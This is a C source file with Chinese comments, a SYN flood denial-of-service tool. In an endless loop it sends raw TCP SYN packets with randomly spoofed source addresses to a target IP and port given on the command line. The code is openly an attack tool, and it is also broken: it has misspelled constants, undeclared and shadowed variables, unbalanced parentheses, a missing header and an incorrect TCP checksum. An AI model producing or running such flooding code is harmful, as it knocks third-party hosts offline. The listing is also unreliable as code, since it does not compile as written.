
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <errno.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/time.h>

#define port 8888

/*compute checksum*/
unsigned short my_cksum(unsigned short *data, int len)
{
  int result = 0;
  int i;
  size_t count;
  count = len;
  for (i = 0; i < len / 2; i++)
  {
    result += *data;
    data++;
    count -= 2;
  }
  if (count > 0)
    result += *(unsigned char *)data;
  while (result >> 16)
    result = (result & 0xffff) + (result >> 16);
  return ~result;
}

void send_data(int sockfd, struct sockaddr_in *addr, int port)
{
  char buf[1024];
  struct iphdr *ip;
  struct tcphdr *tcp;
  int head_len;

  head_len = sizeof(struct iphdr) + sizeof(struct tcphdr); /*SYN包不包含用户数据，即获取整个数据包长度*/
  memset(buf, 0, sizeof(buf));

  ip = (struct iphdr *)buf;
  ip->version = IPVERSION;          /*IP版本*/
  ip->ihl = sizeof(struct ip) >> 2; /*IP包头长度*/
  ip->tos = 0;                      /*服务类型*/
  ip->tot_len = htons(head_len);    /*IP数据包长度*/
  ip->id = 0;
  ip->frag_off = 0;
  ip->ttl = MAXTTL;                  /*TTL时间*/
  ip->protocol = IPPROTO_TCP;        /*协议为TCP*/
  ip->check = 0;                     /*检验和，后面赋值*/
  ip->daddr = addr->sin_addr.s_addr; /*目标主机IP*/

  tcp = (struct tcphdr *)(buf + sizeof(struct ip));
  tcp->source = htons(port);  /*本地发送端端口*/
  tcp->dest = addr->sin_port; /*目标主机端口*/
  tcp->seq = random();        /*随机的序列号，打破三次捂手*/
  tcp->ack_seq = 0;           /*不回应ack*/
  tcp->doff = 5;
  tcp->syn = 1; /*数据类型为SYN请求*/
  tcp->check = 0;
  while (1)
  {
    ip->saddr = random();
    tcp->check = my_cksum((unsigned short *)tcp, sizeof(struct tcphdr));
    sendto(sockfd, buf, head_len, 0, (struct sockaddr *)addr, (socklen_t)sizeof(struct sockaddr_in));
    printf("target ip is :%s  port is %d",inet_ntoa(addr.sin_addr),addr->sin_port));
  }
}

int main(int args, char **argv)
{
  if(args != 3)
  {
    printf(" error!");
    exit(-1);
  }

  unsigned int destport;
  struct sockaddr_in target;
  int socket;
  int on = 1;

  memset(&target,0,sizeof(target));

  //设置攻击主机的端口
  target.sin_family = AF_INIT;
  target.sin_port = htons(atoi(argv[2]));
  target.sin_addr.s_addr = inet_addr(argv[1]);

  sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); //创建一个原生socket
  if (sockfd == -1)
  {
    perror("socket()");
    return -1;
  }

  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) //用模板代码来开启IP_HDRINCL特性，我们完全自己手动构造IP报文
  {
    fprintf(stderr, "setsockopt IP_HDRINCL ERROR! \n");
    exit(1);
  }

  send_data(sockfd,&target,port);

}
